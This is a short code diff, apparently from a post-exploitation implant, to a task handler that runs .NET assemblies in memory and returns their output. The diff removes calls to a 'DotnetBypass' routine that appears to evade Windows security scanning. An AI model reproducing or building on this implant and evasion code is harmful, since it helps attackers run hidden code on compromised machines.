@@ -507,17 +507,9 @@ auto DECLFN Task::Dotnet(
             Str::CharToWChar( wVersion, cVersion, sizeof( wVersion ) );
             Str::CharToWChar( wAppDomName, cAppDomName, sizeof( wAppDomName ) );
 
-            if ( Self->Hw->DotnetBypass ) {
-                Self->Hw->DotnetInit();
-            }
-
             Code = Self->Dot->Inline( 
                 AsmBytes, AsmSize, wArguments, wAppDomName, wVersion, KeepLoad 
             );
-
-            if ( Self->Hw->DotnetBypass ) {
-                Self->Hw->DotnetExit();
-            }
 
             if ( Self->Dot->Out.p && Self->Dot->Out.s ) {
                 Self->Pkg->Bytes( Package, (PUCHAR)Self->Dot->Out.p, Self->Dot->Out.s );
